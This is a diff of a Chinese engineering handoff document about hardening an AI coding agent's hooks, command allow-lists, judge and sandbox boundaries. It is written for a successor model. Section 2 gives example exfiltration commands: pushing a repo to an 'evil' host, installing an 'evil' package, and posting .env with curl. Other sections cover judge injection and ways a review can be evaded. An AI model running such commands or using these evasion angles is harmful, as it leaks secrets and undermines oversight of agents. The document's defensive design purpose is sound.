@@ -34,7 +34,7 @@
 
 ---
 
-## 二、同族自审的三大已知盲区（Claude 走后你最容易漏的，都是踩过的真坑）
+## 二、同族自审的三大已知盲区（Codex 接手后最容易漏的真坑）
 
 1. **deny-oracle ≠ allow-oracle**。命令分析器（`command.ts`）**catch 已知危险**，不能**证明安全**——它自己注释写「判的是不危险、不是可信」。`git`/`npm`/`make`/`node`/`curl`/`cat` 是能力多路复用器，glob 前缀放行 = 交出该程序全部能力面（`git push https://evil` 整库外泄、`npm install evil` 供应链 RCE、`curl -d @.env` 密钥外发）。**别把「analyze clean」当「可自动放行」**——bash 白名单 Path A 就因此被 7 HIGH 撤回。
 2. **信任边界反转**。别从**被审查的产物（cwd 仓库）**读 enforcement 配置：in-repo allow-list / in-repo hook 配置，在 agent 处理不可信仓库时 = 攻击者授权。held-out 秘密要放 cwd 外是同一条教训的另一面。rules 只能加 deny，所以从 cwd 读安全；hooks 能跑命令，只能从可信 env 来源读——**方向相反，别搞混**。
@@ -47,19 +47,19 @@
 ## 三、边界钉死：哪些你能自闭环、哪些必须人把关、哪些别碰
 
 ### ✅ 能 codex 自闭环（红线清晰、机械独立）
-Hooks slice-2 的 ③ 每-hook timeout、⑤ round/session 级事件、给 hook 传 tool result 已落地；⑥ shadow restore 交互确认、⑧ vision MIME sniff + 活体验证已落地；loop 重项仍按核心改动暂缓。剩余见下「五、backlog」。仍要：plan 先行、四关卡、多实例对抗审（见四）。
+Hooks slice-2 的 ③ 每-hook timeout、⑤ round/session 级事件、给 hook 传 tool result 已落地；⑥ shadow restore 交互确认、⑧ vision MIME sniff + 活体验证、loop mid-goal resume 已落地；loop 剩余重项仍按核心改动暂缓。剩余见下「五、backlog」。仍要：plan 先行、四关卡、多实例对抗审（见四）。
 
 ### ⚠️ 必须 plan + 人（Luis）把关（碰核心 / 信任边界，同族自审不够）
 - **hook 信任来源扩展**：多来源合并已按不变量 #2 落地。后续若再新增来源，每个来源都要 realpath 规范化 + 拒 cwd 内 + 只从可信来源加载；绝不新增扫 cwd 的路径。**slice-1 的 HIGH 就栽在信任边界**——这类改动做完**必须请 Luis 在关键项做最终闸**，别单靠同族自审 SHIP。
-- **⑦ loop 的重项**（mid-goal 续跑 / per-goal 异构 verifier / 并行目标）：碰 `decideVerdict` / 裁判架构 / worktree 基建。改错 = 验收被绕 = 自主性信任根崩。**未证明需要，别为「清 backlog」硬做**；真要做，先 plan、把「不得删 / 不得绕三腿」写进方案、请 Luis 把关。
+- **⑦ loop 的重项**（per-goal 异构 verifier / 并行目标 / cron）：碰 `decideVerdict` / 裁判架构 / worktree 基建。改错 = 验收被绕 = 自主性信任根崩。**未证明需要，别为「清 backlog」硬做**；真要做，先 plan、把「不得删 / 不得绕三腿」写进方案、请 Luis 把关。mid-goal resume 已作为 crash/replay 子切片落地。
 
-### ⛔ 能力天花板，别试（不是代码活）
+### ⛔ 能力天花板，先别硬凑
 - **沙箱 #2 客观路由 / #6 裁判 exec**：需 OS 级沙箱（容器 / seccomp / 只读 fs / 网络命名空间）才能「可信地跑任意程序」。没有沙箱，「只读 exec」做不到真只读，给裁判 exec 会破坏「裁判被注入也不能行动」核心属性。当前 `cannotVerify → park` / `fail-closed deny` 是**正确的能力天花板**，不是缺陷。要解先建沙箱基建（环境层工程 + Luis 的方向决策），别用命令白名单硬凑。
 - **propose_skill（skill 自动沉淀）**：已拍板不做（投机、判定弱、无证实复用场景）。
 
 ---
 
-## 四、对抗审查补偿（Claude 走后怎么尽量保住对抗强度）
+## 四、对抗审查补偿（Codex 接手后的强度补偿）
 
 同族自审是本文档存在的原因。尽量逼近跨模型强度：
 1. **多个独立 codex 实例、各带不同攻击视角**（盲批 → decoy 隐藏真实副作用 → 截断走私 → bidi 视觉欺骗 → 边界/竞态），**别单实例读一遍就 SHIP**。
@@ -71,7 +71,7 @@ Hooks slice-2 的 ③ 每-hook timeout、⑤ round/session 级事件、给 hook 
 
 ## 五、backlog（现状 / 目标 / 关键文件 / 红线）—— 可直接当 codex 任务喂
 
-按性价比挑、分阶段、每项独立 commit。Hooks follow-up（传-result、③、⑤、④）、⑥ shadow restore 交互确认、⑧ vision MIME sniff + 活体验证、shadow snapshot 异步化已落地（每轮等 shadow index 捕获，commit 后台 drain）；当前剩余是 ⑦ loop 重项（暂缓 / 另审）。
+按性价比挑、分阶段、每项独立 commit。Hooks follow-up（传-result、③、⑤、④）、⑥ shadow restore 交互确认、⑧ vision MIME sniff + 活体验证、shadow snapshot 异步化、loop mid-goal resume 已落地（每轮等 shadow index 捕获，commit 后台 drain；loop resume 复用 in-flight goalId/session 并恢复 rounds/turns/tokens/breaker；terminal complete 必须重跑验收，baseline/pinned 不信 goal log，session header 缺失/不匹配 fail-closed，loop token budget 记完整 goal tokens）。当前剩余是 ⑦ loop 重项里的 per-goal verifier / 并行目标 / cron（暂缓 / 另审）。
 
 **Hooks follow-up 已落地（2026-07-01）**：PostToolUse 通过 `JARVIS_HOOK_TOOL_RESULT` 拿 tool result（同 4096 cap + 合法 JSON 哨兵）；`HookEntry.timeoutMs` 支持 1..300000 毫秒覆盖；`RoundStart/RoundEnd` 挂在 `runAgent` turn 边界，`SessionStart/SessionEnd` 挂在 REPL/goal/loop CLI 会话边界；多来源合并按 `~/.jarvis/hooks.json` → `JARVIS_HOOKS` 顺序拼接，每来源 realpath + 拒 cwd 内，malformed 只禁该来源；已补真实 Windows `\\?\` 与 symlink smoke。lifecycle 全部 advisory，不阻断、不回灌、不改结果。
 
@@ -80,7 +80,7 @@ Hooks slice-2 的 ③ 每-hook timeout、⑤ round/session 级事件、给 hook 
 
 **⑧ vision MIME sniff + 活体验证已落地（2026-07-01）**：`vision-tool.ts` 现在按 magic bytes 判 PNG/JPEG/WebP/GIF/BMP，扩展名只作显示；不支持的内容在调用 VLM 前拒绝。已用 `ARK_VISION_MODEL=doubao-seed-2-1-pro-260628` 跑 `demo:vision` 真连 ARK：请求形状可用，红/蓝方块测试图返回结构化坐标。实测该模型自然输出 0-1024 视觉坐标网格，故 `VISION_PROMPT` 已把契约从原图像素改为 0-1024 网格；红线：不改 network→gate ask 语义，别把 key 写进代码 / 日志（错误通道已套 `describeModelError`+`redactSecrets`）。
 
-**⑦ loop 重项** —— ⚠️ 见三、未证明需要 + 碰核心，暂缓。
+**⑦ loop 重项** —— mid-goal resume 已落地；per-goal 异构 verifier / 并行目标 / cron 仍见三，未证明需要 + 碰核心，暂缓。
 
 ---
 
